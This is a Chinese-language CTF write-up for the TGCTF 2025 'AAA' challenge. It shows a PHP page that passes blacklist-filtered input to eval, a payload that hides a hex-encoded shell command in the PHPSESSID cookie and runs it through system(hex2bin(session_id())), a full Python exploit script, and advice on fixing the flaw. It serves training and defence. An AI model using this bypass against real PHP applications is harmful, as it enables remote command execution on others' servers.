---
title: "TGCTF 2025 AAA 偷渡阴平（复仇）"
slug: "ctf-tgctf-2025-aaa"
date: 2026-08-31T12:19:11+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "利用 PHP 自身机制与函数特性完成编码绕过。"
summary: "利用 PHP 自身机制与函数特性完成编码绕过。"
tags: ["CTF", "TGCTF", "PHP"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 11
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/11.TGCTF 2025 AAA偷渡阴平(复仇).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-tgctf-2025-aaa/workflow.svg" alt="把被过滤的输入转成等价形式，经过 PHP 自身机制还原后进入执行点。" loading="lazy">
  <figcaption>图 1 · TGCTF AAA 编码绕过。把被过滤的输入转成等价形式，经过 PHP 自身机制还原后进入执行点。</figcaption>
</figure>

## 1. 原题源码

题目把输入直接交给 `eval`，但过滤了大量数字、符号和函数名：

```php
<?php
$tgctf2025 = $_GET['tgctf2025'];
if (!preg_match(
    "/0|1|[3-9]|~|`|@|#|\\$|%|\\^|&|\\*|（|）|-|=|\\+|\\{|\\[|\\]|\\}|:|'|\"|,|<|\\.|>|\\/|\\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i",
    $tgctf2025
)) {
    eval($tgctf2025);
} else {
    die('炸弹');
}
highlight_file(__FILE__);
```

关键点：源码过滤的是**全角括号 `（）`**，ASCII 的 `()` 仍可使用；`system`、`hex2bin`、`session_id` 也没有被过滤。

## 2. 绕过思路

命令 `cat /flag` 转成十六进制：

```python
command = "cat /flag"
print(command.encode().hex())
```

结果：

```text
636174202f666c6167
```

但来源字符串包含数字，直接放进 `tgctf2025` 会被过滤。`session_id()` 可以读取
`PHPSESSID` Cookie，因此把十六进制字符串放进 Cookie：

```text
PHPSESSID=636174202f666c6167
```

参数中只执行：

```php
session_start();system(hex2bin(session_id()));
```

## 3. 完整 Exploit

```python
import requests

url = "http://127.0.0.1:<target-port>/"

command = "cat /flag"
hex_command = command.encode().hex()

cookies = {
    "PHPSESSID": hex_command
}

params = {
    "tgctf2025": "session_start();system(hex2bin(session_id()));"
}

response = requests.get(url, params=params, cookies=cookies, timeout=10)
print(response.status_code)
print(response.text)
```

执行：

```bash
python3 exploit.py
```

## 4. 本地验证

先创建与题目一致的 `index.php`，启动：

```bash
php -S 127.0.0.1:8080
```

确认 `PHPSESSID` 中的十六进制能被 `hex2bin` 还原：

```bash
php -r 'var_dump(hex2bin("636174202f666c6167"));'
```

输出应为：

```text
string(9) "cat /flag"
```

## 5. 排错

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 返回“炸弹” | payload 含黑名单字符 | 逐字符比对真实源码 |
| `session_id()` 为空 | 没有先 `session_start()` | 在 payload 开头启动会话 |
| Cookie 值被截断 | Cookie 中有非法字符 | 十六进制只含 `a-f0-9`，应可安全传输 |
| 命令无输出 | 目标没有 `/flag` | 先执行 `ls` / `pwd` |

## 6. 修复

- 禁止 `eval`；
- 不要用黑名单管代码执行；
- 禁止 `system`、反引号、文件读取；
- 对参数做长度、字符集和语法层白名单。
